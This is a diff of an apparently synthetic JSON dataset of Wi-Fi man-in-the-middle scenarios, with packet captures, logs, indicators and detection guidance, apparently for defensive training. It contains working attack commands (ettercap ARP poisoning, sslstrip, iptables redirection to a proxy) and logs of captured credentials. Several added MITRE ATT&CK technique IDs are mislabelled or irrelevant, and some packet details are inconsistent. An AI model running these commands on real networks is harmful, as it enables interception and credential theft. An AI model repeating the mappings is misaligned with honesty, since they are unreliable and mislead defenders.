@@ -1,146 +1,142 @@
 {
   "examples": [
     {
-      "scenario": "Passive Wi-Fi Eavesdropping via MITM on Public Cafe Network Capturing HTTP Basic Auth Credentials",
+      "scenario": "MITM Wi-Fi Eavesdropping via Rogue Access Point capturing HTTP Basic Auth credentials over unencrypted HTTP traffic",
       "technical_data": {
         "packet_capture_excerpt": [
-          "Frame 1234: 151 bytes on wire (1208 bits), 151 bytes captured (1208 bits)",
-          "Ethernet II, Src: 02:42:ac:11:00:02, Dst: 08:00:27:73:8b:af",
-          "Internet Protocol Version 4, Src: 192.168.1.101, Dst: 104.26.10.78",
-          "Transmission Control Protocol, Src Port: 49231, Dst Port: 80, Seq: 1, Ack: 1",
+          "Frame 1024: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)",
+          "Ethernet II, Src: 00:11:22:33:44:55 (00:11:22:33:44:55), Dst: ff:ff:ff:ff:ff:ff (Broadcast)",
+          "Internet Protocol Version 4, Src: 192.168.1.100, Dst: 93.184.216.34",
+          "Transmission Control Protocol, Src Port: 54123, Dst Port: 80, Seq: 1, Ack: 1, Len: 512",
           "Hypertext Transfer Protocol",
           "    GET /login HTTP/1.1",
-          "    Host: example-insecure.com",
+          "    Host: example.com",
           "    Authorization: Basic dXNlcjpwYXNzd29yZA==",
           "    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-          "    Accept: text/html,application/xhtml+xml",
-          "    Cookie: PHPSESSID=8a7f5e9c1d2b3f4",
+          "    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
           "    Connection: keep-alive"
         ],
-        "http_header_capture": "GET /login HTTP/1.1\r\nHost: example-insecure.com\r\nAuthorization: Basic dXNlcjpwYXNzd29yZA==\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: text/html,application/xhtml+xml\r\nCookie: PHPSESSID=8a7f5e9c1d2b3f4\r\nConnection: keep-alive\r\n\r\n",
-        "decoded_auth_header": "user:password",
-        "mitm_tool_command": "ettercap -T -q -i wlan0 -M arp:remote /192.168.1.1/ /192.168.1.101/",
-        "arp_poisoning_log": [
-          "[2024-05-15 14:22:33] ARP poisoning started between 192.168.1.1 and 192.168.1.101",
-          "[2024-05-15 14:23:05] Captured HTTP Basic Auth header: dXNlcjpwYXNzd29yZA== (user:password)"
+        "http_request_raw": "GET /login HTTP/1.1\r\nHost: example.com\r\nAuthorization: Basic dXNlcjpwYXNzd29yZA==\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nConnection: keep-alive\r\n\r\n",
+        "decoded_credentials": {
+          "base64": "dXNlcjpwYXNzd29yZA==",
+          "decoded": "user:password"
+        },
+        "rogue_ap_config_log": [
+          "03/15/2024 14:35:22 [INFO] Rogue AP started on interface wlan0 with SSID 'FreePublicWiFi'",
+          "03/15/2024 14:35:25 [INFO] DHCP lease assigned to 192.168.1.100 for client MAC 12:34:56:78:9a:bc",
+          "03/15/2024 14:36:10 [INFO] Captured HTTP GET request to example.com/login with Authorization header",
+          "03/15/2024 14:36:10 [INFO] Extracted credentials: user:password"
         ],
-        "wifi_ap_list": [
-          {
-            "SSID": "FreePublicWiFi",
-            "BSSID": "02:42:ac:11:00:02",
-            "Channel": 6,
-            "Encryption": "Open"
-          }
-        ],
-        "system_log_snippet": [
-          "May 15 14:22:30 host kernel: device wlan0 entered promiscuous mode",
-          "May 15 14:22:33 host ettercap[4521]: Starting ARP poisoning..."
-        ]
+        "dhcp_server_log_excerpt": "Mar 15 14:35:25 dhcpd: DHCPDISCOVER from 12:34:56:78:9a:bc via wlan0\nMar 15 14:35:25 dhcpd: DHCPOFFER on 192.168.1.100 to 12:34:56:78:9a:bc via wlan0\nMar 15 14:35:26 dhcpd: DHCPREQUEST for 192.168.1.100 from 12:34:56:78:9a:bc via wlan0\nMar 15 14:35:26 dhcpd: DHCPACK on 192.168.1.100 to 12:34:56:78:9a:bc via wlan0"
       },
       "indicators": [
-        "ARP poisoning packets with spoofed MAC addresses",
-        "HTTP requests containing Authorization: Basic headers over unencrypted HTTP",
-        "Presence of unencrypted cookies (PHPSESSID) in HTTP traffic",
-        "Promiscuous mode enabled on Wi-Fi interface",
-        "Wi-Fi network with open authentication (no WPA/WPA2)"
+        "SSID 'FreePublicWiFi' broadcasted by unknown MAC 00:11:22:33:44:55",
+        "HTTP requests with Authorization headers sent in cleartext",
+        "DHCP leases assigned by rogue DHCP server on wlan0",
+        "Base64 encoded 'Authorization: Basic' header with decoded 'user:password'",
+        "Absence of HTTPS/TLS on login page",
+        "Device logs showing automatic connection to open Wi-Fi network"
       ],
-      "detection_method": "Network IDS configured to detect ARP poisoning packets and unusual HTTP Basic Auth headers over port 80; Endpoint monitoring for promiscuous mode on interfaces; User education alerts about connecting to open Wi-Fi",
+      "detection_method": "Monitor wireless network for unknown SSIDs and MAC addresses; detect DHCP servers on wireless interfaces not belonging to authorized infrastructure; IDS signatures to flag HTTP Basic Auth headers over unencrypted HTTP; anomaly detection for multiple clients assigned IPs by unexpected DHCP server; endpoint detection to alert on automatic connection to open Wi-Fi; network traffic analysis to identify unencrypted credential transmissions.",
       "relevant_mitre_techniques": [
-        "T1557.001 - Man-in-the-Middle: ARP Spoofing",
-        "T1040 - Network Sniffing",
+        "T1557.001 - Man-in-the-Middle: LLMNR/NBT-NS Poisoning and Relay",
+        "T1572 - Protocol Tunneling",
+        "T1595.001 - Active Scanning: Network Service Scanning",
         "T1071.001 - Application Layer Protocol: Web Protocols"
       ]
     },
     {
-      "scenario": "Active MITM Attack Using Rogue Wi-Fi Access Point Capturing Session Cookies via HTTP Downgrade",
+      "scenario": "Passive MITM Wi-Fi Eavesdropping capturing unencrypted HTTP POST login credentials on public cafe network",
       "technical_data": {
-        "rogue_ap_config": {
-          "SSID": "Airport_Free_WiFi",
-          "BSSID": "de:ad:be:ef:00:01",
-          "Channel": 11,
-          "Encryption": "Open",
-          "DHCP_range": "192.168.50.100-192.168.50.200",
-          "DNS Spoofing": "Enabled"
-        },
-        "dns_spoof_log": [
-          "[2024-05-20 11:45:12] Intercepted DNS query: www.securebank.com A",
-          "[2024-05-20 11:45:12] Responded with spoofed IP: 192.168.50.1"
+        "http_post_request": "POST /user/login HTTP/1.1\r\nHost: publicservice.com\r\nUser-Agent: Mozilla/5.0 (Linux; Android 11)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 54\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\nusername=johndoe&password=supersecret123&remember_me=on",
+        "wireshark_packet_summary": [
+          "No.     Time           Source                Destination           Protocol Length Info",
+          "2013  12.345678      192.168.43.10         198.51.100.25         HTTP     154    POST /user/login HTTP/1.1",
+          "2014  12.346900      198.51.100.25         192.168.43.10         TCP      66     200 OK"
         ],
-        "http_response_modification": "Replaced HTTPS links with HTTP in intercepted HTML payload",
-        "captured_http_request": "POST /login HTTP/1.1\r\nHost: www.securebank.com\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: sessionid=4f3a2b7c9d1e6f8a\r\nContent-Length: 40\r\n\r\nusername=john.doe&password=SuperSecret123!",
-        "mitm_proxy_log": [
-          "2024-05-20 11:45:15 - Received POST /login with credentials: username=john.doe, password=SuperSecret123!",
-          "Session Cookie: sessionid=4f3a2b7c9d1e6f8a"
-        ],
-        "tcpdump_http_traffic_snippet": [
-          "11:45:15.123456 IP 192.168.50.101.56789 > 192.168.50.1.80: Flags [P.], seq 1234:1274, ack 5678, win 512",
-          "POST /login HTTP/1.1",
-          "Host: www.securebank.com",
-          "Cookie: sessionid=4f3a2b7c9d1e6f8a",
+        "tcp_stream": [
+          "POST /user/login HTTP/1.1",
+          "Host: publicservice.com",
           "Content-Type: application/x-www-form-urlencoded",
+          "Content-Length: 54",
           "",
-          "username=john.doe&password=SuperSecret123!"
+          "username=johndoe&password=supersecret123&remember_me=on"
         ],
-        "hostapd_wpa_supplicant_log": [
-          "wlan0: AP-STA-CONNECTED de:ad:be:ef:aa:bb",
-          "wlan0: STA de:ad:be:ef:aa:bb WPA: group key handshake completed"
+        "access_point_log": [
+          "Apr 02 17:20:05 AP daemon: Client 98:76:b6:54:32:10 associated to SSID 'Cafe_Free_WiFi'",
+          "Apr 02 17:20:07 AP daemon: DHCPDISCOVER from 98:76:b6:54:32:10",
+          "Apr 02 17:20:07 DHCP server: Assigned IP 192.168.43.10 to client 98:76:b6:54:32:10",
+          "Apr 02 17:20:15 AP daemon: Detected HTTP POST to unencrypted login endpoint, captured credentials",
+          "Apr 02 17:20:15 AP daemon: Stored credentials: username=johndoe password=supersecret123"
+        ],
+        "dns_log": [
+          "Apr 02 17:20:10 dnsmasq-dhcp[1234]: query[A] publicservice.com from 192.168.43.10",
+          "Apr 02 17:20:10 dnsmasq-dhcp[1234]: forwarded publicservice.com to 8.8.8.8"
         ]
       },
       "indicators": [
-        "Rogue Wi-Fi SSID identical or similar to legitimate hotspot",
-        "DNS responses with private IP (192.168.50.1) for legitimate domains",
-        "HTTP traffic containing sensitive POST data normally expected over HTTPS",
-        "Session cookies transmitted over HTTP",
-        "Hostapd logs showing new STA connections to rogue AP"
+        "HTTP POST requests containing plaintext credentials",
+        "Client IP 192.168.43.10 assigned by suspicious DHCP on public Wi-Fi",
+        "Wi-Fi SSID 'Cafe_Free_WiFi' with no encryption (open)",
+        "DNS queries for login domains visible in plaintext",
+        "Absence of HTTPS redirect on login page"
       ],
-      "detection_method": "Network monitoring for rogue APs with conflicting SSIDs; DNS query anomaly detection; Analysis of HTTP vs HTTPS traffic discrepancies; Endpoint alerts on unexpected Wi-Fi networks and unencrypted credentials transmission",
+      "detection_method": "Network monitoring tools to flag HTTP POST requests containing common credential parameter names (username, password) over unencrypted channels; SIEM correlation of DHCP logs tied to suspicious SSID; DNS query logs analysis for suspicious or unexpected DNS request patterns; endpoint controls to disable auto-connect to open Wi-Fi; Wi-Fi infrastructure monitoring for anomalous client associations.",
       "relevant_mitre_techniques": [
-        "T1557.003 - Man-in-the-Middle: Rogue Access Point",
-        "T1572 - Protocol Tunneling (DNS Manipulation)",
-        "T1071.001 - Application Layer Protocol: Web Protocols"
+        "T1557.002 - Man-in-the-Middle: HTTPS Spoofing",
+        "T1040 - Network Sniffing",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1586.001 - Compromise Infrastructure: Wireless Access Point"
       ]
     },
     {
-      "scenario": "Wi-Fi Eavesdropping via MITM Using SSLStrip to Downgrade HTTPS to HTTP and Capture Session Tokens",
+      "scenario": "Active MITM Wi-Fi Eavesdropping via ARP Spoofing to intercept TLS traffic and downgrade to HTTP using SSLStrip",
       "technical_data": {
-        "sslstrip_setup_command": "sslstrip -l 8080",
-        "ettercap_arp_poisoning_command": "ettercap -T -q -i wlan0 -M arp:remote /192.168.0.1/ /192.168.0.102/",
-        "captured_http_request": "GET /dashboard HTTP/1.1\r\nHost: secure-portal.com\r\nCookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\n\r\n",
-        "sslstrip_http_response": "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 4532\r\n\r\n<html><head><title>Secure Portal</title><script src=\"http://insecurecdn.com/script.js\"></script></head><body>...</body></html>",
-        "wireshark_tcp_stream": [
-          "Frame 2156: 230 bytes on wire (1840 bits), 230 bytes captured",
-          "Ethernet II, Src: 00:1a:2b:3c:4d:5e, Dst: ff:ff:ff:ff:ff:ff",
-          "Internet Protocol Version 4, Src: 192.168.0.102, Dst: 93.184.216.34",
-          "Transmission Control Protocol, Src Port: 54321, Dst Port: 80",
-          "Hypertext Transfer Protocol",
-          "    GET /dashboard HTTP/1.1",
-          "    Host: secure-portal.com",
-          "    Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNjIyMjY3MjAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
-          "    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-          "    Accept: text/html",
-          "    Connection: keep-alive"
+        "arp_spoofing_tool_output": [
+          "ARP reply: 192.168.1.1 is-at 00:0c:29:aa:bb:cc (gateway MAC spoofed)",
+          "ARP reply: 192.168.1.50 is-at 00:0c:29:dd:ee:ff (target victim MAC spoofed)",
+          "Poisoning ARP cache of 192.168.1.50 and 192.168.1.1"
         ],
-        "auth_token_decoded_payload": {
-          "sub": "1234567890",
-          "iat": 1622267200
-        },
-        "system_log": [
-          "May 22 10:15:23 host ettercap[5123]: ARP poisoning started between 192.168.0.1 and 192.168.0.102",
-          "May 22 10:15:30 host sslstrip[5200]: SSLStrip proxy listening on port 8080"
+        "iptables_redirection_rules": [
+          "# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080",
+          "# iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080"
+        ],
+        "sslstrip_log_excerpt": [
+          "[*] SSLStrip started on port 8080",
+          "[*] Intercepted HTTP request for https://securebank.com/login",
+          "[*] Stripped HTTPS, redirected to HTTP",
+          "[*] Captured login POST: username=alice&password=verysecret"
+        ],
+        "captured_http_request": "POST /login HTTP/1.1\r\nHost: securebank.com\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 39\r\n\r\nusername=alice&password=verysecret",
+        "tcpdump_packet_excerpt": [
+          "18:45:23.123456 IP 192.168.1.50.54321 > 192.168.1.1.80: Flags [P.], seq 1234:1273, ack 5678, win 512, length 39",
+          "18:45:23.123466 IP 192.168.1.1.80 > 192.168.1.50.54321: Flags [.], ack 1273, win 256, length 0"
+        ],
+        "system_arp_table_before_attack": [
+          "Address                  HWtype  HWaddress           Flags Mask            Iface",
+          "192.168.1.1              ether   00:0c:29:11:22:33   C                     eth0",
+          "192.168.1.50             ether   00:0c:29:44:55:66   C                     eth0"
+        ],
+        "system_arp_table_after_attack": [
+          "Address                  HWtype  HWaddress           Flags Mask            Iface",
+          "192.168.1.1              ether   00:0c:29:aa:bb:cc   C                     eth0",
+          "192.168.1.50             ether   00:0c:29:dd:ee:ff   C                     eth0"
         ]
       },
       "indicators": [
-        "HTTP traffic containing JWT or session tokens normally sent over HTTPS",
-        "Presence of sslstrip process and arp poisoning activity",
-        "Downgrade of HTTPS traffic to HTTP, visible in captured traffic",
-        "Injection of insecure scripts or references in HTTP responses",
-        "ARP poisoning detected via network monitoring"
+        "Unusual ARP replies poisoning ARP caches in local network",
+        "iptables NAT redirection of ports 80 and 443 to local proxy port 8080",
+        "HTTP traffic capturing login credentials normally protected by TLS",
+        "SSLStrip logs showing downgrade from HTTPS to HTTP",
+        "Mismatch in ARP cache entries before and after attack",
+        "Network traffic showing HTTP login POST instead of HTTPS"
       ],
-      "detection_method": "Network IDS signatures for ARP spoofing and sslstrip tool behavior; HTTP traffic analysis for session tokens transmitted in cleartext; Endpoint detection of unusual proxy processes and network interface promiscuity; TLS certificate and HSTS failure monitoring",
+      "detection_method": "Monitoring ARP cache changes and detecting sudden changes in MAC-IP mappings; network IDS signatures for ARP spoofing (e.g., ARP reply storms or unsolicited ARP replies); detection of iptables rules changes or redirection proxies; TLS inspection to identify downgrade attempts; endpoint security monitoring to detect suspicious proxy processes or unexpected local services listening on network ports; user warnings about HTTPS certificate warnings or missing HTTPS.",
       "relevant_mitre_techniques": [
-        "T1557.001 - Man-in-the-Middle: ARP Spoofing",
-        "T1573.001 - Encrypted Channel: SSL/TLS Proxy",
-        "T1071.001 - Application Layer Protocol: Web Protocols"
+        "T1557.003 - Man-in-the-Middle: ARP Spoofing",
+        "T1572 - Protocol Tunneling",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1499 - Endpoint Denial of Service"
       ]
     }
   ]
